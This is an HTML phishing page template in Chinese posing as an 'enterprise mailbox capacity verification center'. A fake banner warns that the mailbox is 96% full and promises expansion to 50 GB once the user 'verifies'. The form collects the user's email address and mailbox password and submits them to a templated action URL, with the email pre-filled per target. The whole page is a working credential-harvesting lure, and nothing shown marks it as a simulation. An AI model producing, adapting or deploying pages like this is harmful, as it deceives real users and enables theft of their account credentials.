<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>邮箱容量验证中心</title>
</head>
<body style="margin:0;background:#eef2f7;font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;color:#1f2937">
<div style="max-width:560px;margin:40px auto;background:#fff;border:1px solid #d7dde5;border-radius:8px;box-shadow:0 6px 24px rgba(15,43,92,.10)">
  <div style="padding:20px 28px;border-bottom:1px solid #e5e7eb;display:flex;align-items:center;gap:10px">
    <span style="display:inline-block;width:30px;height:30px;background:#1e3a8a;border-radius:6px;color:#fff;text-align:center;line-height:30px;font-weight:700">@</span>
    <span style="font-size:17px;font-weight:700">企业邮箱容量验证中心</span>
  </div>
  <div style="padding:28px">
    <div style="background:#fef3c7;border:1px solid #fcd34d;color:#92400e;padding:12px 14px;border-radius:6px;font-size:13px;margin-bottom:22px">
      您的邮箱容量已使用 <b>96%</b>，验证通过后将自动扩容至 50 GB。
    </div>
    <form method="post" action="{{formAction}}">
      <label style="display:block;font-size:13px;font-weight:600;margin-bottom:6px">邮箱地址</label>
      <input name="email" type="text" value="{{email}}" autocomplete="username"
             style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #d1d5db;border-radius:6px;font-size:14px;margin-bottom:18px;background:#f9fafb">
      <label style="display:block;font-size:13px;font-weight:600;margin-bottom:6px">邮箱密码</label>
      <input name="password" type="password" autocomplete="current-password"
             style="width:100%;box-sizing:border-box;padding:10px 12px;border:1px solid #d1d5db;border-radius:6px;font-size:14px;margin-bottom:22px">
      <button type="submit" style="width:100%;background:#1e3a8a;color:#fff;border:none;padding:12px;border-radius:6px;font-size:15px;font-weight:600;cursor:pointer">验证并扩容</button>
    </form>
  </div>
</div>
</body>
</html>
